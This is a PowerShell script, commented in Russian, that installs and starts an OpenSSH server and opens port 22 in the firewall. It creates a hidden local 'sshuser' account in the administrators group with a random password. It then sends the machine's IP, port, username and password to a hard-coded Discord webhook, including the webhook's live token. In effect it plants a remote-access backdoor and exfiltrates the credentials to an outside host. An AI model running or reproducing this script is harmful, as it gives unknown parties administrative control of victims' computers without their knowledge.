try {
    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # URL вебхука Discord
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'

    # Функция отправки сообщения в Discord
    function Send-DiscordMessage($MessageContent) {
        $Message = @{
            content = $MessageContent
        }
        try {
            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'
        } catch {
            Write-Host "Не удалось отправить сообщение в Discord: $($Error[0])" -ForegroundColor Red
        }
    }

    # Отправляем стартовое сообщение
    Send-DiscordMessage "🚀 Начало установки OpenSSH Server..."

    # Устанавливаем SSH Server
    if ($IsLinux) {
        Send-DiscordMessage "💻 Обнаружена Linux-система. Устанавливаем OpenSSH Server..."
        & sudo apt install openssh-server -y
        Send-DiscordMessage "✅ OpenSSH Server установлен на Linux."
    } else {
        Send-DiscordMessage "🖥️ Обнаружена Windows-система. Устанавливаем OpenSSH Server..."
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'
        Send-DiscordMessage "✅ OpenSSH Server установлен и запущен на Windows."

        # Настраиваем firewall, если правила нет
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
            Send-DiscordMessage "🔒 Настроено правило firewall для SSH."
        } else {
            Send-DiscordMessage "🛡️ Правило firewall для SSH уже существует."
        }
    }

    # Генерируем случайный пароль
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
    Send-DiscordMessage "🔑 Сгенерирован пароль: `$Password"

    # Добавляем пользователя для подключения (только Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        net user $Username $Password /add
        net localgroup administrators $Username /add
        Send-DiscordMessage "👤 Создан пользователь: `$Username."
    }

    # Получаем основной IP-адрес
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
        $_.InterfaceAlias -notmatch "Loopback" -and 
        $_.IPAddress -notlike "169.254.*" -and 
        $_.IPAddress -notlike "192.168.56.*" 
    }).IPAddress -join ", "
    Send-DiscordMessage "🌐 IP-адрес устройства: $IPAddress"

    # Настройки порта
    $Port = 22
    Send-DiscordMessage "⚙️ Порт SSH: $Port"

    # Итоговое сообщение
    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    Send-DiscordMessage "✅ OpenSSH Server успешно установлен за $Elapsed секунд!\nIP: $IPAddress\nPort: $Port\nUser: $Username\nPassword: $Password"

} catch {
    $ErrorMessage = "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
    Send-DiscordMessage $ErrorMessage
} finally {
    Send-DiscordMessage "🛑 Установка завершена. Нажмите любую клавишу для выхода."
    Pause
}
